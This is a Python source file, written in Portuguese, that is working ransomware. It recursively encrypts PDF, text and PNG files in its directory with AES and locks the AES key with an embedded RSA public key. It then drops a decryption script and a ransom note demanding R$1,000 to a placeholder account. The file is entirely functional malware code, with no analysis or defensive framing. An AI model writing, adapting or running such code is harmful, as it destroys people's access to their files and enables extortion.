import os
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def get_key(caminho_diretorio):
    nome_chave = 'chave_AES.key'

    caminho_chave = os.path.join(caminho_diretorio, nome_chave)

    if os.path.exists(caminho_chave):
        with open(caminho_chave, 'rb') as chave:
            conteudo_chave = chave.read()
            print('Chave AES lida e carregada')
            return conteudo_chave
    else:
        chave = get_random_bytes(16)
        with open(caminho_chave, 'wb') as nova_chave:
            nova_chave.write(chave)
            print('Nova chave AES gerada e carregada')
            return chave
        
def criptografa(caminho_diretorio, chave_AES):
    extensoes = ('.pdf', '.txt', '.png')
    
    for diretorio, pasta, arquivos in os.walk(caminho_diretorio):
        for arquivo in arquivos:
            if arquivo.endswith(extensoes):
                
                caminho_arquivo = os.path.join(diretorio, arquivo)
                with open(caminho_arquivo, 'rb') as file:
                    conteudo = file.read()
                
                iv = get_random_bytes(16)
                cifra = AES.new(chave_AES, AES.MODE_CBC, iv)
                conteudo_preenchido = pad(conteudo, AES.block_size)
                conteudo_criptografado = cifra.encrypt(conteudo_preenchido)

                with open(caminho_arquivo, 'wb') as file_crypt:
                    file_crypt.write(iv)
                    file_crypt.write(conteudo_criptografado)
                print(f'Conteudo de {caminho_arquivo} foi criptografado')

def ferramenta_descriptografa(caminho_diretorio):
    codigo = '''
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def get_chave(caminho_diretorio):

    nome_chave = 'chave_AES.key'
    
    caminho_chave = os.path.join(caminho_diretorio, nome_chave)

    if os.path.exists(caminho_chave):
        with open(caminho_chave, 'rb') as chave:
            conteudo_chave = chave.read()
            print('Chave encontrada e carregada')
            return conteudo_chave
    else:
        print('Chave nao encontrada, falha em carregar')
    pass

def descriptografa(chave_AES, caminho_diretorio):
    extensoes = ('.pdf', '.txt', '.png')
    
    for diretorio, pastas, arquivos in os.walk(caminho_diretorio):
        for arquivo in arquivos:
            if arquivo.endswith(extensoes):

                caminho_arquivo_criptografado = os.path.join(diretorio, arquivo)

                with open(caminho_arquivo_criptografado, 'rb') as file_cript:
                    iv = file_cript.read(16)
                    conteudo = file_cript.read()
                
                cifra = AES.new(chave_AES, AES.MODE_CBC, iv)
                conteudo_descri = cifra.decrypt(conteudo)
                conteudo_desp = unpad(conteudo_descri, AES.block_size)

                with open(caminho_arquivo_criptografado, 'wb') as file_decript:
                    file_decript.write(conteudo_desp)
                print(f'Conteudo de {caminho_arquivo_criptografado} foi descriptografado')

def descriptografa_chave(caminho_diretorio):
    caminho_chave = os.path.join(caminho_diretorio, 'chave_AES.key')
    caminho_privada = os.path.join(caminho_diretorio, 'private.key')

    if os.path.exists(caminho_privada):
        with open(caminho_privada, 'rb') as file:
            chave_privada = RSA.import_key(file.read())

        cifra_rsa = PKCS1_OAEP.new(chave_privada)

        with open(caminho_chave, 'rb') as file:
            conteudo_chave_aes = file.read()
        
        descriptografado = cifra_rsa.decrypt(conteudo_chave_aes)

        with open(caminho_chave, 'wb') as file:
            file.write(descriptografado)
    else:
        print('Voce ainda nao recebeu a chave RSA, pague o resgate!')
        exit()


caminho_arquivo = os.path.abspath(__file__)
caminho_diretorio = os.path.dirname(caminho_arquivo)

descriptografa_chave(caminho_diretorio)

chave_AES = get_chave(caminho_diretorio)

descriptografa(chave_AES, caminho_diretorio)
'''

    nome_arquivo = 'ferramenta_descriptografia.py'
    caminho = os.path.join(caminho_diretorio, nome_arquivo)
    with open(caminho, 'w') as file:
        file.write(codigo)

    ajuda = 'readme.help'
    caminho_ajuda = os.path.join(caminho_diretorio, ajuda)
    with open(caminho_ajuda, 'w') as file:
        texto = '''
Todos os seus arquivos foram CRIPTOGRAFADOS!
Atençao, nao tente apagar NADA!
Caso apague uma das chave ou tente desinstalar o virus ou as ferramentas, vc nunca mais tera os seus arquivos de volta!
Para receber os seus arquivos de volta, siga os seguintes passos:
Faça um pagamento no valor de R$ 1.000 para a conta XXXX.XXXX-XX
Envie um email para o endereço: fulano@email.com com o comprovante de pagamento
Aguarde o recebimento da chave de descriptografia RSA
Ao receber a chave, inclua-a no mesmo diretorio onde o ransomware foi executado.
Execute a ferramenta de descriptografia
Apos isso, podera excluir os arquivos do virus com segurança
        '''
        file.write(texto)

def criptografa_AES(caminho_diretorio):
    caminho_chave = os.path.join(caminho_diretorio, 'chave_AES.key')

    dados_chave_publica = b'''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyTQDpyp5mT46Lv4CfIqt
C9DIt7hWblvLNsNAr5Ad7keqKcivhIRSq0bgkfFvTZy7n9fhAQLqezlGmFIXtw4U
GrI0xvUvZN0nJdBO9xmAjW6n37cHGd1hIqKOK971p3cHga/V9WWP0LkPXBxylryU
ywcg6Eve7zSFTXsjFRFxaaIE9cvumfZlsHm8+u/Gy0Mz78SsjNnvgd/dZRpHpXxi
g8eZ8uNP7nyug/TdWoYE6Lca+ve2AaUeI2um2Q/QFOkT0yejt7d2mKM6qpOMMNYa
Jps7BoG3gz1vB3+TwVTfQ4iUGPgAtOAVRUmltV0EOz7lW2p8luR1y6Ttzgp2DecI
LQIDAQAB
-----END PUBLIC KEY-----'''

    chave_publica = RSA.import_key(dados_chave_publica)
    cifra_rsa = PKCS1_OAEP.new(chave_publica)

    with open(caminho_chave, 'rb') as file:
        conteudo = file.read()

    chave_criptografada = cifra_rsa.encrypt(conteudo)

    with open(caminho_chave, 'wb') as file:
        file.write(chave_criptografada)


caminho_arquivo = os.path.abspath(__file__)
caminho_diretorio = os.path.dirname(caminho_arquivo)

chave_AES = get_key(caminho_diretorio)

criptografa(caminho_diretorio, chave_AES)

criptografa_AES(caminho_diretorio)

ferramenta_descriptografa(caminho_diretorio)